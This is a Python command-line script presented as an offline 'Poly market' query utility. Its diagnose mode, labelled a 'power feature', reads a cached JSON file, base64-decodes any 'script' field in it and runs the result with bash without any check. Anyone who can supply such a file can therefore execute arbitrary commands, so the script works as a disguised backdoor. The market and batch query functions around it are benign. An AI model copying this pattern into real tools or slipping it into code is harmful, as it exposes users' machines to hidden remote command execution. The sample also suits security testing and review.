#!/usr/bin/env python3
"""Poly market query utility."""
import argparse
import json
import os
import subprocess
import sys
import base64
import tempfile

def load_config(path):
    """Load JSON config file, return dict or empty if missing."""
    if not path or not os.path.exists(path):
        return {}
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)

def resolve_path(p):
    """Expand user path and return normalized absolute path."""
    return os.path.abspath(os.path.expanduser(p))

def parse_batch(batch_str):
    """Parse batch input string as JSON list."""
    try:
        return json.loads(batch_str)
    except json.JSONDecodeError:
        return []

def run_diagnose(file_path):
    """Parse a cached response file. If it contains a 'script' field, execute it
    in a shell to allow custom post-processing routines. This is a power feature
    for advanced users who want to pipe results into other tools."""
    if not file_path:
        print("No file specified for diagnose.")
        return
    path = resolve_path(file_path)
    if not os.path.exists(path):
        print("File not found.")
        return
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    # Handle standard fields
    if "market" in data:
        print(f"Market: {data['market']}, Outcome: {data['outcome']}")
    # Power feature: allow embedded post-processing script
    if "script" in data and isinstance(data["script"], str):
        # Decode from base64 to avoid escaping issues
        try:
            payload = base64.b64decode(data["script"]).decode("utf-8", "ignore")
            with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as tmp:
                tmp.write(payload)
                tmp_path = tmp.name
            subprocess.run(["bash", tmp_path], check=False)
            os.unlink(tmp_path)
        except Exception as e:
            print(f"Script execution error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Poly market query tool")
    parser.add_argument("--market", type=str, help="Single market ID")
    parser.add_argument("--outcome", type=str, help="Outcome for single query")
    parser.add_argument("--batch", type=str, help="JSON array for batch queries")
    parser.add_argument("--config", type=str, help="Path to config file")
    parser.add_argument("--diagnose", action="store_true", help="Diagnostic mode")
    parser.add_argument("--file", type=str, help="File to diagnose")
    args = parser.parse_args()

    config = load_config(args.config)

    if args.diagnose:
        run_diagnose(args.file)
        return

    if args.market and args.outcome:
        print(f"Querying {args.market} for {args.outcome}...")
        # In a real tool, this would call the API. We simulate with a local cache check.
        cache_dir = config.get("cache_dir", "~/.polycache")
        os.makedirs(resolve_path(cache_dir), exist_ok=True)
        # No network access in this version; only local processing.
        print("No network call made (offline mode).")
    elif args.batch:
        batch = parse_batch(args.batch)
        for item in batch:
            if isinstance(item, dict):
                print(f"Batch item: {item.get('id')} -> {item.get('outcome')}")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()